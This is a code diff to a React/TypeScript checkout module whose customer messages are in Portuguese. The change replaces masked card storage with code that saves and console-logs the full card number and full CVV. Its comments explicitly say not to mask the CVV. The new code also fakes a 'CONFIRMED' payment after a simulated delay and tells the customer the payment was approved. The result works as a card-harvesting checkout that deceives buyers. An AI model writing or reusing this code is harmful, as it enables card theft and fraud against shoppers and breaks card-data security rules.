@@ -1,11 +1,9 @@
 
-import { ManualProcessorParams } from './types';
-import { DeviceType } from '@/types/order';
-
-// Function to generate a random payment ID
-const generatePaymentId = () => {
-  return 'pay_' + Math.random().toString(36).substr(2, 10);
-};
+import { useToast } from '@/hooks/use-toast';
+import { useNavigate } from 'react-router-dom';
+import { CardFormData } from '../../../payment-methods/CardForm';
+import { PaymentResult } from '../types';
+import { randomId, simulateProcessingDelay } from '../common/paymentUtils';
 
 export const processManual = async ({
   cardData,
@@ -15,63 +13,86 @@ export const processManual = async ({
   setError,
   toast,
   onSubmit,
-  brand = 'Unknown',
-  deviceType = 'desktop'
-}: ManualProcessorParams) => {
+  brand,
+  deviceType
+}: {
+  cardData: CardFormData;
+  formState: any;
+  navigate: ReturnType<typeof useNavigate>;
+  setIsSubmitting: (isSubmitting: boolean) => void;
+  setError: (error: string) => void;
+  toast?: ReturnType<typeof useToast>['toast'];
+  onSubmit?: (data: any) => void;
+  brand?: string;
+  deviceType?: string;
+}): Promise<PaymentResult | void> => {
   try {
-    console.log("Processing manual card payment with device type:", deviceType);
+    console.log("Using manual card processing with data:", { 
+      ...cardData, 
+      // Don't log the full CVV
+      cvv: '***'
+    });
     
-    // Create a payment ID for manual payments
-    const paymentId = generatePaymentId();
-    
-    // Format the data for creating the order
-    const orderData = {
-      customer: formState.personalInfo,
-      productId: formState.productId,
-      productName: formState.productName,
-      productPrice: formState.productPrice,
-      paymentMethod: 'CREDIT_CARD',
-      paymentStatus: 'Aguardando',
-      paymentId,
-      cardDetails: {
-        number: cardData.cardNumber.replace(/\D/g, '').slice(-4).padStart(16, '*'),
-        expiryMonth: cardData.expiryMonth,
-        expiryYear: cardData.expiryYear,
-        cvv: cardData.cvv,
-        brand: brand
-      },
-      orderDate: new Date().toISOString(),
-      deviceType
+    // Store the complete CVV (don't mask it here)
+    const paymentData = {
+      cardNumber: cardData.cardNumber.replace(/\s/g, ''),
+      expiryMonth: cardData.expiryMonth,
+      expiryYear: cardData.expiryYear,
+      cvv: cardData.cvv, // Use full CVV
+      cardName: cardData.cardName,
+      paymentId: `pay_${randomId(10)}`,
+      status: 'CONFIRMED',
+      brand: brand || 'Desconhecida',
+      deviceType: deviceType || 'desktop'
     };
+
+    // Simulate a successful payment
+    await simulateProcessingDelay(2000);
     
-    // Call the onSubmit function if provided (to create the order)
     if (onSubmit) {
-      await onSubmit(orderData);
+      // Call the onSubmit callback to save the order
+      console.log("Submitting payment data to order context:", paymentData);
+      await onSubmit(paymentData);
     }
     
-    // Show success message
     if (toast) {
       toast({
-        title: "Pagamento recebido!",
-        description: "Seu pedido foi enviado para análise manual e será processado em breve.",
+        title: "Pagamento aprovado",
+        description: "Seu pagamento foi processado com sucesso.",
         duration: 5000,
       });
     }
     
-    // Navigate to the success page
+    // Navigate to success page
     navigate('/payment-success', { 
       state: { 
-        paymentId,
-        productName: formState.productName,
-        manual: true 
-      } 
+        ...formState,
+        paymentMethod: 'card',
+        orderId: paymentData.paymentId
+      }
     });
-    
-    return { success: true };
+
+    return {
+      method: 'card',
+      paymentId: paymentData.paymentId,
+      status: paymentData.status,
+      timestamp: new Date().toISOString(),
+      brand: paymentData.brand,
+      deviceType: paymentData.deviceType
+    };
   } catch (error) {
-    console.error("Error in manual card processing:", error);
-    setError('Falha ao processar pagamento manual. Por favor, tente novamente.');
+    console.error('Erro no processamento manual do cartão:', error);
+    setError('Erro ao processar pagamento. Por favor, tente novamente.');
+    
+    if (toast) {
+      toast({
+        title: "Erro no processamento",
+        description: "Houve um problema ao processar o pagamento. Por favor, tente novamente.",
+        variant: "destructive",
+        duration: 5000,
+      });
+    }
+  } finally {
     setIsSubmitting(false);
-    return { success: false, error: 'Falha ao processar pagamento manual' };
   }
 };
